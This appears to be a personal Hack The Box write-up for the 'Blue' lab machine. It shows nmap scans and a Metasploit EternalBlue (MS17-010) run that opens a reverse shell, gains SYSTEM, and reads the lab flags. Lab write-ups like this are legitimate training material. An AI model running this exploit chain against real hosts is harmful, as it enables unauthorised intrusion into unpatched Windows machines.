---
title: "Blue HTB"
date: 2024-07-17T17:41:04-07:00
draft: Falus
---

# Summery
This box is an MS17-010-EternalBlue box. Recorded with CVE-2017-0144 and a CSVV V3.x Base Score of 8.1 High. I will run the Metasploit module.

## Blue
IP=10.10.10.40

`ports=$(nmap -Pn -p- --min-rate=1000 -T4 $IP -oN nmap-p | grep ^[0-9] | cut -d '/' -f 1 | tr '\n' ',' | sed s/,$//)`

```sh
cat nmap-p
# Nmap 7.94SVN scan initiated Wed Jul 17 17:09:38 2024 as: nmap -Pn -p- --min-rate=1000 -T4 -oN nmap-p 10.10.10.40
Nmap scan report for 10.10.10.40
Host is up (0.092s latency).
Not shown: 65526 closed tcp ports (conn-refused)
PORT      STATE SERVICE
135/tcp   open  msrpc
139/tcp   open  netbios-ssn
445/tcp   open  microsoft-ds
49152/tcp open  unknown
49153/tcp open  unknown
49154/tcp open  unknown
49155/tcp open  unknown
49156/tcp open  unknown
49157/tcp open  unknown
```

`nmap -sCV -p$ports $IP -oN nmap-sCV`

```sh 
-[Wed Jul 17-17:10:18]-[jmk@parrot]-
-[~/Documents/Blue]$ nmap -sCV -p$ports $IP -oN nmap-sCV
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-07-17 17:10 PDT
Nmap scan report for 10.10.10.40
Host is up (0.086s latency).

PORT      STATE SERVICE      VERSION
135/tcp   open  msrpc        Microsoft Windows RPC
139/tcp   open  netbios-ssn  Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds Windows 7 Professional 7601 Service Pack 1 microsoft-ds (workgroup: WORKGROUP)
49152/tcp open  msrpc        Microsoft Windows RPC
49153/tcp open  msrpc        Microsoft Windows RPC
49154/tcp open  msrpc        Microsoft Windows RPC
49155/tcp open  msrpc        Microsoft Windows RPC
49156/tcp open  msrpc        Microsoft Windows RPC
49157/tcp open  msrpc        Microsoft Windows RPC
Service Info: Host: HARIS-PC; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: mean: -19m44s, deviation: 34m35s, median: 12s
| smb-security-mode:
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb2-time:
|   date: 2024-07-18T00:11:36
|_  start_date: 2024-07-18T00:07:48
| smb2-security-mode:
|   2:1:0:
|_    Message signing enabled but not required
| smb-os-discovery:
|   OS: Windows 7 Professional 7601 Service Pack 1 (Windows 7 Professional 6.1)
|   OS CPE: cpe:/o:microsoft:windows_7::sp1:professional
|   Computer name: haris-PC
|   NetBIOS computer name: HARIS-PC\x00
|   Workgroup: WORKGROUP\x00
|_  System time: 2024-07-18T01:11:40+01:00

```

```sh
[msf](Jobs:0 Agents:0) >> use auxiliary/scanner/smb/smb_version
[msf](Jobs:0 Agents:0) auxiliary(scanner/smb/smb_version) >> run

[*] 10.10.10.40:445       - SMB Detected (versions:1, 2) (preferred dialect:SMB 2.1) (signatures:optional) (uptime:8m 13s) (guid:{8628aa4c-b692-4e3f-a5e8-31bc7de34bae}) (authentication domain:HARIS-PC)Windows 7 Professional SP1 (build:7601) (name:HARIS-PC)
[+] 10.10.10.40:445       -   Host is running SMB Detected (versions:1, 2) (preferred dialect:SMB 2.1) (signatures:optional) (uptime:8m 13s) (guid:{8628aa4c-b692-4e3f-a5e8-31bc7de34bae}) (authentication domain:HARIS-PC)Windows 7 Professional SP1 (build:7601) (name:HARIS-PC)
[*] 10.10.10.40:          - Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
[msf](Jobs:0 Agents:0) exploit(windows/smb/ms17_010_eternalblue) >>
[msf](Jobs:0 Agents:0) exploit(windows/smb/ms17_010_eternalblue) >> set rhosts 10.10.10.40
rhosts => 10.10.10.40
[msf](Jobs:0 Agents:0) exploit(windows/smb/ms17_010_eternalblue) >> set lhost tun0
lhost => 10.10.14.5
[msf](Jobs:0 Agents:0) exploit(windows/smb/ms17_010_eternalblue) >> run

[*] Started reverse TCP handler on 10.10.14.5:4444
[*] 10.10.10.40:445 - Using auxiliary/scanner/smb/smb_ms17_010 as check
[+] 10.10.10.40:445       - Host is likely VULNERABLE to MS17-010! - Windows 7 Professional 7601 Service Pack 1 x64 (64-bit)
<snip>
(Meterpreter 1)(C:\Windows\system32) > getuid
Server username: NT AUTHORITY\SYSTEM
<snip>
(Meterpreter 1)(C:\Users\haris\Desktop) > cat user.txt
fc9<snip>cf9
(Meterpreter 1)(C:\Users\haris\Desktop) > cd ../../Administrator
(Meterpreter 1)(C:\Users\Administrator) > cd Desktop
(Meterpreter 1)(C:\Users\Administrator\Desktop) > dir
Listing: C:\Users\Administrator\Desktop
=======================================

Mode              Size  Type  Last modified              Name
----              ----  ----  -------------              ----
100666/rw-rw-rw-  282   fil   2017-07-20 23:56:40 -0700  desktop.ini
100444/r--r--r--  34    fil   2024-07-17 17:08:40 -0700  root.txt

(Meterpreter 1)(C:\Users\Administrator\Desktop) > cat root.txt
24e<snip>3fd

```

That is the box. I would like to try to run the run and understand the script without using Metasploit.


